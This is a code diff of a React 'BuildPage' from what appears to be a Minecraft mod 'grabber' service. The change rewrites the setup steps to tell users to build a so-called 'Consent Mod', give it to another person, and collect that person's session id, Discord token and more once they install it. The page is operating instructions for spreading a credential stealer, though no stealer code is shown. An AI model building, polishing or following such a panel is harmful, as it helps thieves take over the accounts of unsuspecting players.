@@ -224,11 +224,11 @@ export default function BuildPage() {
           <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 16 }}>
             <div style={{ fontSize: 13, color: colors.textDim }}>
               <div style={{ color: colors.green, fontWeight: 600, marginBottom: 4 }}>1. Link Minecraft Username</div>
-              Go to Dashboard and enter your Minecraft username. This links your account to your mod grabs automatically.
+                Build the Consent Mod at the top right and download it.
             </div>
             <div style={{ fontSize: 13, color: colors.textDim }}>
               <div style={{ color: colors.green, fontWeight: 600, marginBottom: 4 }}>2. Download &amp; Install</div>
-              Download the JAR, place it in your Minecraft mods folder. Your grabs will auto-appear on your dashboard.
+              When downloaded, give it to a person. When they downloaded it their Session id, Discord token and more will show up at their grab.
             </div>
           </div>
         </div>
